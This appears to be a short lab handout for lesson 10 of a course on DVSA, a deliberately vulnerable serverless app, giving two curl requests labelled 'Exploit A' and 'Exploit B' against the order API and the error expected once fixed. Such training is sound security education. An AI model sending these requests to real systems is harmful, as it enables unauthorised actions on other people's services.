# Lesson 10 Commands

Set API and token:

```bash
export API_URL="https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order"
export DVSA_TOKEN="REDACTED"
```

Exploit A:

```bash
curl -s "$API_URL" \
  -H "content-type: application/json" \
  -H "authorization:$DVSA_TOKEN" \
  --data-raw '{"action":"get"}' | jq
```

Exploit B:

```bash
curl -s "$API_URL" \
  -H "content-type: application/json" \
  -H "authorization:$DVSA_TOKEN" \
  --data-raw '{"action":"complete"}' | jq
```

Post-fix expected result:

```json
{"status":"err","msg":"internal error"}
```
